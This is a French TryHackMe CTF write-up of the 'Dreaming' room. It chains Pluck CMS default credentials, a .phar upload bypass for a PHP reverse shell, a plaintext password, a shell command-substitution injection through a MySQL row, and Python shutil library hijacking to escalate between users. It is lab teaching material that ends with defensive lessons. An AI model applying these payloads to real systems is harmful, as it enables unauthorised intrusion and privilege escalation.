---
title: "CTF - Dreaming"
date: 2026-04-28
categories: [tryhackme]
tags: [webexploitation,RCE,file-upload,cve,sql-injection,privilege-escalation,python,cms,reverse-shell,library-hijacking]
image: /assets/img/writeups/dreaming/logo.png
---

## Introduction

La room Dreaming proposée sur TryHackMe s'inspire de l'univers de *The Sandman*. L'objectif est de retrouver les flags cachés associés à trois personnages :

<div style="display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin: 20px 0;">
  <div style="border: 1px solid #444; border-radius: 8px; padding: 8px; background: #1e1e1e;">
    <img src="/assets/img/writeups/dreaming/lucian.png" alt="Lucian" style="width: 220px; height: 220px; object-fit: cover; border-radius: 4px;"><br>
    Lucian
  </div>
  <div style="border: 1px solid #444; border-radius: 8px; padding: 8px; background: #1e1e1e;">
    <img src="/assets/img/writeups/dreaming/death.png" alt="Death" style="width: 220px; height: 220px; object-fit: cover; border-radius: 4px;"><br>
    Death
  </div>
  <div style="border: 1px solid #444; border-radius: 8px; padding: 8px; background: #1e1e1e;">
    <img src="/assets/img/writeups/dreaming/morpheus.png" alt="Morpheus" style="width: 220px; height: 220px; object-fit: cover; border-radius: 4px;"><br>
    Morpheus
  </div>
</div>

## Phase d'énumération 
Scan Nmap :
```shell
$ nmap -p- -sC -sV -Pn 10.81.172.84  
# Nmap 7.98 scan initiated Mon Jun 15 13:59:05 2026 as: /usr/lib/nmap/nmap -p- -sC -sV -Pn -oN scan_nmap.txt 10.80.130.144
Nmap scan report for 10.81.172.84
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:73:1f:e1:ca:93:f7:87:5f:48:ed:b0:39:ff:92:4d (RSA)
|   256 e1:ab:ad:e0:48:77:e3:64:4f:b6:85:40:05:05:92:d0 (ECDSA)
|_  256 3f:48:d6:c6:d9:16:5f:f1:a4:6d:5e:ec:ef:8c:c1:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 15 13:59:28 2026 -- 1 IP address (1 host up) scanned in 22.70 seconds

```
`-p-` : scanne l’ensemble des 65535 ports    
`-sC` : exécute les scripts par défaut      
`-sV` : détecte les versions des services      
`-Pn` : ignore le ping initial (utile si l’hôte bloque les ICMP)      

<u>Il y a 2 ports ouverts :</u>

- **22 (SSH)**  
Un service SSH est actif. Il pourrait être exploitable si des identifiants valides sont obtenus.

- **80 (HTTP)**  
Un serveur web Apache est accessible. Il mérite une analyse approfondie afin d'identifier d'éventuelles vulnérabilités ou informations sensibles.


##  Web Exploitation 
En nous rendant sur le site, nous arrivons sur la page d'accueil de base d'Apache (fichier par défaut).
Après analyse de la page source, je n'ai rien trouvé de très intéressant. J'ai donc poursuivi par la recherche de répertoires cachés, en utilisant l'outil **Feroxbuster**, qui permet de scanner un site web en profondeur afin de trouver de potentiels dossiers ou fichiers cachés :

```bash
$ feroxbuster -u http://10.81.172.84/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.81.172.84/
 🚩  In-Scope Url          │ 10.81.172.84
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://10.81.172.84/icons/ubuntu-logo.png
301      GET        9l       28w      310c http://10.81.172.84/app => http://10.81.172.84/app/
301      GET        9l       28w      323c http://10.81.172.84/app/pluck-4.7.13 => http://10.81.172.84/app/pluck-4.7.13/
200      GET      375l      964w    10918c http://10.81.172.84/
[####################] - 41s    30007/30007   0s      found:4       errors:0      
[####################] - 41s    30000/30000   736/s   http://10.81.172.84/ 
[####################] - 0s     30000/30000   247934/s http://10.81.172.84/app/ => Directory listing (add --scan-dir-listings to scan)
```
L’outil révèle un élément intéressant : 
- `/app/pluck-4.7.13` 

Avant de me rendre sur la page, j'ai rapidement recherché ce qu'était **Pluck**. En réalité, il s'agit d'un CMS (*Content Management System*), qui permet de créer des sites web facilement, sans connaissance en langage de programmation.

Maintenant que nous savons ce que c'est, nous pouvons continuer. En arrivant sur la page, je n'ai rien remarqué de spécial à première vue. Mais en analysant l'URL `http://10.81.172.84/app/pluck-4.7.13/?file=dreaming`, j'ai remarqué que le paramètre `file` prenait directement un nom de fichier en entrée. Cela m'a fait penser à une vulnérabilité assez commune : le **Path Traversal** (ou traversée de répertoire).

**Path Traversal :**  
<u>Définition Path Traversal</u>  
> Cette vulnérabilité survient lorsqu'une application utilise un paramètre fourni par l'utilisateur pour construire un chemin vers un fichier sur le serveur, sans vérifier correctement sa valeur. **En manipulant ce paramètre** (par exemple avec des séquences `../`), **un attaquant peut** "**remonter**" **l'arborescence du serveur et accéder à des fichiers auxquels il n'est normalement pas censé avoir accès** (fichiers de configuration, mots de passe, code source, etc.).

![Gif](/assets/img/writeups/dreaming/test.gif) 


Suite à cette tentative infructueuse, j'ai analysé le code source de la page et remarqué un lien vers une page de connexion. J'ai recherché les identifiants par défaut de l'administrateur Pluck via une requête Google, et j'ai découvert que le mot de passe était simplement **password**.

![page](/assets/img/writeups/dreaming/phase1-ferox.png)

En le testant, j'ai pu accéder au panel de contrôle administrateur.

![accueil](/assets/img/writeups/dreaming/accueil.png)


## Reverse Shell

Maintenant que j'avais accès au panel, l'étape logique suivante était de chercher comment exploiter cette version spécifique de Pluck. J'ai alors recherché s'il n'existait pas une vulnérabilité publique (CVE) associée à la version 4.7.13.

🎉 Bingo : j'ai trouvé une CVE associée à Pluck 4.7.13 ! Selon [cette source](https://loopspell.medium.com/cve-2020-29607-remote-code-execution-via-file-upload-restriction-bypass-f5cff38d94c6), la vulnérabilité repose sur un **contournement de filtrage d'extensions** (*file upload restriction bypass*). Autrement dit : bien que le serveur bloque certaines extensions (comme `.php`), il est possible de les contourner en utilisant une extension non-blacklistée (`.phar`).

**Comment ça marche ?**
> Beaucoup de serveurs web utilisent une approche "blacklist" : ils listent les extensions dangereuses à refuser (`.php`, `.php3`, `.phtml`...). Mais cette méthode est fragile, car il existe des dizaines d'extensions alternatives que le serveur peut exécuter en tant que PHP. Parmi elles : `.phar` (archive PHP), `.inc`, `.php5`, etc. En uploadant un fichier `.phar` contenant du code PHP, on peut contourner le filtrage et exécuter du code arbitraire.

J'ai accédé à la section **"Manage Files"** du panel administrateur pour utiliser la fonctionnalité d'upload. Ensuite, j'ai utilisé un reverse shell PHP public trouvé sur GitHub : [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

**⚠️ Important :** il était crucial de modifier les variables `$ip` et `$port` dans le script pour qu'ils pointent vers votre IP d'attaquant et vers le port sur lequel vous écoutez. J'ai ensuite renommé le fichier en `.phar` pour contourner le filtrage du serveur.

```shell
  $ mv shell.php shell.phar
``` 

![page](/assets/img/writeups/dreaming/revershell.png)

Une fois le fichier uploadé, j'ai cliqué sur l'icône de loupe pour que le serveur Apache **interprète et exécute** le fichier. Sans cette action, le fichier resterait simplement stocké sur le serveur sans être traité.

![page](/assets/img/writeups/dreaming/revershell2.png)

Après avoir cliqué sur la loupe et écouté sur mon port local (via `nc -lvnp 1234`), j'ai obtenu un shell interactif en tant que l'utilisateur **www-data** (l'utilisateur sous lequel tourne le serveur Apache).

### Stabilisation du shell

Après avoir obtenu un shell en tant que l'utilisateur **www-data**, il est important de le "stabiliser".   
Par défaut, les reverse shells sont basiques et peu confortables à utiliser : pas d'autocomplétion, ... . Pour remédier à cela, j'ai exécuté les commandes suivantes :

```shell
$ python -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm
$ ^Z                          (Ctrl+Z)
$ stty raw -echo; fg
```

**Explication de ces commandes :**
- `python -c 'import pty;pty.spawn("/bin/bash")'` : utilise le module Python `pty` pour obtenir un pseudo-terminal interactif. Cela nous donne un vrai `/bin/bash` au lieu d'un simple shell.
- `export TERM=xterm` : définit la variable d'environnement `TERM` pour que le terminal comprenne les codes couleur et de formatage (sinon tout s'affiche en brut).
- `Ctrl+Z` : suspend temporairement le processus shell courant.
- `stty raw -echo; fg` : configure le terminal en mode "raw" (traitement minimal) et désactive l'écho local, puis ramène le shell en avant-plan (`fg`). Cela permet au shell de gérer entièrement l'affichage et l'entrée utilisateur.

Le résultat : un shell "complet" où on peut utiliser l'historique des commandes, Ctrl+C pour arrêter un processus, etc.

### Recherche des flags

Maintenant que nous avions un shell stable et fonctionnel, j'ai commencé à explorer le système en cherchant des fichiers suspects ou des indices. Après avoir parcouru les répertoires habituels (`/tmp`, `/opt`, `/var`), j'ai regardé du côté du répertoire `/home`, où sont généralement stockés les fichiers personnels des utilisateurs.

J'ai découvert que chacun des trois personnages que nous cherchions disposait d'un répertoire dédié :
- `/home/lucien`
- `/home/death`
- `/home/morpheus`

Et chacun contenait un fichier `x_flag.txt` avec des permissions restrictives (seul l'utilisateur propriétaire, ou faisant partie du même groupe pouvait le lire).

![Aperçu du site](/assets/img/writeups/dreaming/flags.png)

## Pivoting

### Flag : Lucien

Lorsque j'ai tenté de lire le flag de Lucien directement, j'ai reçu une erreur de permission, ce qui est tout à fait normal. Cependant, l'idée m'est venue de chercher d'autres fichiers appartenant à Lucien sur lesquels j'aurais malgré tout les droits de lecture en tant que `www-data`.

Pour ce faire, j'ai utilisé la commande `find` avec des critères spécifiques :

```shell
www-data@ip-10-81-144-114:/$ find / -type f -user lucien -perm -o+r 2> /dev/null
/opt/test
```

<u>Explication de la commande :</u>
- `find /` : lance la recherche depuis la racine du système.
- `-type f` : limite la recherche aux fichiers uniquement (pas les répertoires).
- `-user lucien` : cherche les fichiers dont le propriétaire est l'utilisateur `lucien`.
- `-perm -o+r` : filtre sur les fichiers ayant la permission de lecture pour "others"   
  (le `o+r` signifie que n'importe qui, y compris `www-data` peut les lire).
- `2> /dev/null` : masque les erreurs de permission pour une sortie plus propre.

Un élément important est ressorti : le fichier `/opt/test.py`.

![Aperçu du site](/assets/img/writeups/dreaming/lucian_flag.png)

Après analyse du fichier, j'ai découvert quelque chose de critique : **le mot de passe de Lucien était stocké en clair dans ce fichier**. Une mauvaise pratique grave de sécurité. Une fois en possession du mot de passe, j'ai pu me connecter en tant que Lucien via la commande `su` (*substitute user*) :

```shell
www-data@ip-10-81-144-114:/$ su lucien
Password: Hxxxxxxxxxxxxxxx
lucien@ip-10-81-144-114:/$ cat /home/lucien/lucien_flag.txt
THM{Txxxxxxxxxxxx}
```
![Aperçu du site](/assets/img/writeups/dreaming/lucien_shell.png)
- <span style="color:#00ff99;">FLAG Lucien : THM{Txxxxxxxxxxxx}</span>

### Flag : Death

Maintenant en tant que Lucien, l'étape suivante était de trouver un moyen d'accéder au compte de Death. J'ai commencé par vérifier quels droits Lucien possédait via la commande `sudo -l` :
![Aperçu du site](/assets/img/writeups/dreaming/death1.png)  
**Qu'est-ce que ça signifie ?**
> Lucien peut exécuter le script Python `/home/death/getDreams.py` **en tant que l'utilisateur Death**, sans avoir besoin d'entrer un mot de passe. C'est potentiellement une faille de configuration : permettre à un utilisateur d'exécuter un script en tant qu'un autre utilisateur peut mener à une escalade de privilèges si ce script est vulnérable.

J'ai donc exécuté le script avec `sudo` :
```shell
$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
``` 
![Aperçu du site](/assets/img/writeups/dreaming/death2.png) 

Le script affiche des données en provenance d'une base de données MySQL, avec deux colonnes : un "dreamer" (rêveur) et son "dream" (rêve). J'ai alors supposé que ce script lisait depuis une table MySQL.

**💡L'idée :** si je pouvais injecter du contenu malveillant directement dans la base de données, le script l'afficherait à l'écran. Je pourrais ainsi extraire des informations sensibles, notamment le mot de passe que Death utilise pour accéder à la base.

Pour accéder à la base, j'ai recherché dans l'historique de commandes de Lucien (`.bash_history`) et trouvé :

```shell
$ mysql -u lucien -pxxxxxxxxxxxxxxxxxx
```
![Aperçu du site](/assets/img/writeups/dreaming/db_struct.png)   

Une fois connecté à MySQL, j'ai inséré une ligne malveillante dans la table `dreams` contenant le contenu du fichier `/home/death/getDreams.py` :

```sql
insert into dreams values ("test", "$(head -n 20 /home/death/getDreams.py)");
```
![Aperçu du site](/assets/img/writeups/dreaming/db_payload.png)   
<u>Explication commande : </u>
- `head` : cette commande affiche les **premières lignes** d'un fichier. Par défaut, elle en affiche 10.
- `-n 20` : l'option `-n` (pour "number") permet de spécifier le nombre de lignes à afficher. Ici, on demande les **20 premières lignes** du fichier.
- `/home/death/getDreams.py` : le fichier cible. On aurait pu utiliser simplement `head /home/death/getDreams.py` pour en afficher les 10 premières lignes, mais `-n 20` en affiche plus.
- `$(...)` : c'est de la substitution de commande en bash. Le contenu entre `$(` et `)` est **exécuté comme une commande**, et son résultat remplace la chaîne. Donc `$(head -n 20 /home/death/getDreams.py)` signifie : *"exécute `head -n 20 /home/death/getDreams.py`, puis insère le résultat ici"*.

<u>Pourquoi 20 lignes ?</u>  
Parce que le début du script Python contient généralement les imports et les variables importantes, c'est là que se trouvent souvent les credentials comme les identifiants MySQL.  

Puis j'ai exécuté à nouveau le script en tant que Death :

```shell
lucien@ip-10-81-149-100:/home/death$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky
Bob + Exploring ancient ruins
Carol + Becoming a successful entrepreneur
Dave + Becoming a professional musician
test + import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "!xxxxxxxxxxxxxxx"
DB_NAME = "library"

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
...
```

🎉 Bingo ! En lisant le code source du script via cette injection de base de données, j'ai découvert les credentials MySQL :  
- **Utilisateur:** death
- **Mot de passe:** !xxxxxxxxxxxxxxx

Maintenant en possession du mot de passe de Death, j'ai pu me connecter à ce compte :

```shell
lucien@ip-10-81-149-100:~$ su death
Password: 
death@ip-10-81-149-100:/home/death$ cat /home/death/death_flag.txt
THM{1xxxxxxxxxxxxx}
```

![Aperçu du site](/assets/img/writeups/dreaming/death_flag.png)
- <span style="color:#00ff99;">FLAG death : THM{1xxxxxxxxxxxxx}</span>


## Privilege Escalation 
### Flag : Morpheus

En tant que Death, l'étape suivante était d'accéder au compte de Morpheus. J'ai commencé par explorer le répertoire `/home/morpheus` et découvert plusieurs fichiers intéressants, notamment un script Python nommé `restore.py`.

![Aperçu du site](/assets/img/writeups/dreaming/morpheus_restore.png)
En analysant ce script, j'ai remarqué qu'il utilisait la fonction `copy2()` de la librairie `shutil` pour copier un fichier vers un répertoire de sauvegarde (`/kingdom_backup/kingdom`).

**💡L'idée :** plutôt que de chercher un mot de passe, je pouvais **détourner la librairie `shutil`** que le script importait. Si je modifiais cette librairie pour y injecter du code arbitraire, ce code s'exécuterait avec les privilèges de Morpheus quand le script l'importerait.

J'ai d'abord localisé le fichier `shutil.py` :

```shell
$ find / -type f -name "shutil.py" 2> /dev/null
```
![Aperçu du site](/assets/img/writeups/dreaming/morpheus1.png)

J'ai ensuite vérifié les permissions du fichier :

```shell
death@ip-10-81-144-114:~$ ls -l /usr/lib/python3.8/shutil.py
-rw-rw-r-- 1 root death 20480 Oct 27  2021 /usr/lib/python3.8/shutil.py
```

**C'était la faille !** Le fichier appartenait à `root`, mais il était **modifiable par le groupe `death`** (les permissions `rw-rw-r--` l'indiquent clairement). Étant donné que j'étais connecté en tant que Death, je pouvais modifier à ma guise ce fichier.

**Petit rappel : comment fonctionnent les imports Python ?**
> Quand un script Python exécute `import shutil`, l'interpréteur cherche le module `shutil` dans les répertoires du chemin de recherche Python (`sys.path`). S'il le trouve localement d'abord, il l'importe en priorité. En modifiant `/usr/lib/python3.8/shutil.py`, toute script qui importe `shutil` utilisera **notre version modifiée**, même s'il tourne avec des privilèges supérieurs.

Au lieu de créer un reverse shell compliqué, j'ai simplement ajouté une ligne au début du fichier `shutil.py` pour modifier les permissions du flag de Morpheus :

```python
import os
os.system('chmod 777 /home/morpheus/morpheus_flag.txt')
```
![Aperçu du site](/assets/img/writeups/dreaming/morpheus_payload.png)

Une fois cette modification effectuée, je n'ai pas eu besoin de relancer le script manuellement. Le script s'est exécuté **automatiquement** quelques instants après, probablement via une tâche `cron` programmée en arrière-plan (une tâche planifiée qui réexécute régulièrement `restore.py`).

Dès que le script s'est relancé et a importé notre `shutil.py` modifié, notre commande `chmod 777` s'est exécutée avec les privilèges de Morpheus, rendant le fichier de flag lisible par tous :
Quand le script s'exécutait et importait `shutil`, notre code malveillant s'exécutait en premier, changeant les permissions du fichier `morpheus_flag.txt` pour le rendre lisible par tous (`chmod 777`).

```shell
death@ip-10-81-144-114:/home/morpheus$ cat morpheus_flag.txt
THM{Dxxxxxxxxxxxxxxxxxxxxx}
```
![Aperçu du site](/assets/img/writeups/dreaming/morpheus_flag.png)

- <span style="color:#00ff99;">FLAG Morpheus : THM{Dxxxxxxxxxxxxxxxxxxxxx}</span>



## Conclusion
Ce challenge met en évidence :

- L'importance de la validation sécurisée des uploads : 
  - Par exemple, on aurait pu **utiliser une "whitelist" complète** plutôt qu'une "blacklist" incomplète. Accepter les extensions `.phar` alors qu'on bloque `.php` est une mauvaise configuration au niveau sécurité.

- Les dangers du stockage de mots de passe en clair :
  - Le mot de passe de Lucien stocké dans `/opt/test.py` en texte brut a permis l'accès direct au compte.   
    **Les mots de passe devraient toujours être chiffrés** ou gérés via un gestionnaire de secrets.

- Les risques d'une configuration sudo trop permissive :
  - Autoriser un utilisateur à exécuter un script sans mot de passe (`NOPASSWD`) combiné à une faille SQL injection dans ce script a suffi à compromettre le compte suivant.

- La critique des permissions sur les fichiers système : 
  - Une librairie Python modifiable (`shutil.py`) par un utilisateur non-privilégié a permis le library hijacking.   
    **Les permissions sur `/usr/lib` doivent être strictes.**

- L'importance d'une méthodologie rigoureuse : 
  - Une simple faille de filtrage d'extensions, combinée à plusieurs mauvaises configurations, a mené à la compromission complète du système et l'accès à tous les flags.